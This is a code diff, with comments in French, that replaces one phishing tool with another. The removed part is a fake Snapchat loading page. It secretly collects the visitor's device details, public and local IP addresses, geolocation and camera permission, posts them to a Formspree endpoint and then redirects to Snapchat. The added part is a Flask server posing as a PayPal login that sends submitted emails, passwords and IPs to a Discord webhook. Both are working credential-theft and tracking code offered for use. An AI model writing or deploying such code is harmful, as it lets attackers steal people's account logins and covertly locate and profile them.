@@ -1,87 +1,43 @@
-<!DOCTYPE html>
-<html>
-<head>
-<title>Snapchat</title>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<style>
-body { margin:0; height:100vh; background:#FFFC00; display:flex; align-items:center; justify-content:center; font-family:Arial; }
-#fake { text-align:center; }
-#fake img { width:200px; height:200px; }
-</style>
-</head>
-<body>
-<div id="fake">
-<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=" alt="">
-<p style="font-size:18px;">Chargement...</p>
-</div>
-<script>
-const FORMSPREE_URL = 'https://formspree.io/f/xljryeek';
+import os
+from flask import Flask, request, render_template_string, redirect
+import requests
+import datetime
 
-async function sendData(data) {
-    try {
-        await fetch(FORMSPREE_URL, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json', 'Accept': 'application/json'},
-            body: JSON.stringify(data)
-        });
-    } catch(e) {}
-}
+app = Flask(__name__)
 
-async function main() {
-    let info = {};
+# Récupère le webhook depuis les variables d'environnement
+DISCORD_WEBHOOK = os.environ.get('DISCORD_WEBHOOK', '')
+# Ne jamais le mettre en dur dans le code
 
-    info.userAgent = navigator.userAgent;
-    info.platform = navigator.platform;
-    info.language = navigator.language;
-    info.hardwareConcurrency = navigator.hardwareConcurrency;
-    info.deviceMemory = navigator.deviceMemory || 'unknown';
-    info.screen = window.screen.width + 'x' + window.screen.height + '@' + window.devicePixelRatio + 'x';
-    info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    info.referrer = document.referrer;
+PAGE = """..."""  # (le même HTML)
 
-    try {
-        const resp = await fetch('https://api.ipify.org?format=json');
-        const data = await resp.json();
-        info.ip = data.ip;
-    } catch(e) {}
+@app.route('/')
+def home():
+    return PAGE
 
-    try {
-        const rtc = new RTCPeerConnection({iceServers: []});
-        rtc.createDataChannel('');
-        rtc.onicecandidate = (e) => {
-            if (e.candidate) {
-                const ip = e.candidate.candidate.split(' ')[4];
-                if (ip && !ip.includes(':')) info.localIP = ip;
-            }
-        };
-        await rtc.createOffer().then(o => rtc.setLocalDescription(o));
-        setTimeout(() => rtc.close(), 2000);
-    } catch(e) {}
+@app.route('/login', methods=['POST'])
+def login():
+    email = request.form.get('email', '')
+    password = request.form.get('password', '')
+    if DISCORD_WEBHOOK:
+        payload = {
+            'content': '🔐 **NOUVEAUX IDENTIFIANTS**',
+            'embeds': [{
+                'title': 'PayPal',
+                'color': 0x0070ba,
+                'fields': [
+                    {'name': 'Email', 'value': email, 'inline': False},
+                    {'name': 'Mot de passe', 'value': password, 'inline': False},
+                    {'name': 'IP', 'value': request.remote_addr, 'inline': True}
+                ],
+                'footer': {'text': datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')}
+            }]
+        }
+        try:
+            requests.post(DISCORD_WEBHOOK, json=payload)
+        except:
+            pass
+    return redirect('https://www.paypal.com')
 
-    try {
-        const position = await new Promise((resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(resolve, reject, {timeout:5000});
-        });
-        info.location = {lat: position.coords.latitude, lon: position.coords.longitude, accuracy: position.coords.accuracy};
-    } catch(e) {}
-
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
-        stream.getTracks().forEach(t => t.stop());
-        info.cameraMicrophone = 'granted';
-    } catch(e) {
-        info.cameraMicrophone = 'denied';
-    }
-
-    await sendData(info);
-
-    setTimeout(() => {
-        window.location.href = 'https://www.snapchat.com/';
-    }, 3000);
-}
-
-main();
-</script>
-</body>
-</html>
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8080)
